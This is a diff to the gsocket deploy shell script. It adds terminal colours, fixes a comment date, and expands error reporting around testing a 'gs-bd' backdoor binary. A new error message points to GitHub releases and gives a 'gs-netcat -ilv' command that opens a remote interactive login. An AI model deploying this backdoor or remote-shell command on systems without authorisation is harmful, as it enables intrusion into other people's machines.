@@ -140,10 +140,13 @@ CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "dbus")
 
 [[ -t 1 ]] && {
 	CY="\033[1;33m" # yellow
+	CDY="\033[0;33m" # yellow
 	CG="\033[1;32m" # green
 	CR="\033[1;31m" # red
 	CDR="\033[0;31m" # red
+	CB="\033[1;34m" # blue
 	CC="\033[1;36m" # cyan
+	CDC="\033[0;36m" # cyan
 	CM="\033[1;35m" # magenta
 	CN="\033[0m"    # none
 	CW="\033[1;37m"
@@ -504,7 +507,7 @@ try_dstdir()
 	cp "$ebin" "$trybin" &>/dev/null || { rm -f "${trybin:?}"; return; }
 	chmod 700 "$trybin"
 
-	# Between 28th April and end of May we accidentially
+	# Between 28th April and end of May 2020 we accidentially
 	# over wrote /bin/true with gs-bd binary. Thus we use -g
 	# to make true, id and gs-bd return true (in case it's gs-bs).
 	"${trybin}" -g &>/dev/null || { rm -f "${trybin:?}"; return 104; } # FAILURE
@@ -1060,8 +1063,17 @@ WARN_EXECFAIL_SET()
 WARN_EXECFAIL()
 {
 	[[ -z "$WARN_EXECFAIL_MSG" ]] && return
-	echo -e "--> Please send this output to ${CC}root@proton.thc.org${CN} to get it fixed."
-	echo -e "--> ${WARN_EXECFAIL_MSG}"
+	[[ -n "$ERR_LOG" ]] && echo -e "${CDR}${ERR_LOG}${CN}"
+	echo -en "${CDR}"
+	ls -al "${DSTBIN}"
+	echo -e "${CN}--> ${WARN_EXECFAIL_MSG}
+--> GS_OSARCH=${OSARCH}
+--> ${CDC}GS_DSTDIR=${DSTBIN%/*}${CN}
+--> Try to set ${CDC}export GS_DEBUG=1${CN} and deploy again.
+--> Please send that output to ${CM}root@proton.thc.org${CN} to get it fixed.
+--> Alternatively, try the static binary from
+--> ${CB}https://github.com/hackerschoice/gsocket/releases${CN}
+--> ${CDC}chmod 755 gs-netcat; ./gs-netcat -ilv${CN}."
 }
 
 HOWTO_CONNECT_OUT()
@@ -1369,16 +1381,21 @@ gs_access()
 test_bin()
 {
 	local bin
-	local err_log
 	unset IS_TESTBIN_OK
 
 	bin="$1"
 
 	# Try to execute the binary
-	GS_OUT=$("$bin" -g 2>/dev/null)
+	unset ERR_LOG
+	GS_OUT=$("$bin" -g 2>&1)
 	ret=$?
-	# 126 - Exec format error
-	[[ -z "$GS_OUT" ]] && { FAIL_OUT; ERR_LOG="wrong binary"; WARN_EXECFAIL_SET "$ret" "wrong binary"; return; }
+	[[ $ret -ne 0 ]] && {
+		# 126 - Exec format error
+		FAIL_OUT
+		ERR_LOG="$GS_OUT"
+		WARN_EXECFAIL_SET "$ret" "wrong binary"
+		return
+	}
 
 	# Use randomly generated secret unless it's set already (X=)
 	[[ -z $GS_SECRET ]] && GS_SECRET="$GS_OUT"
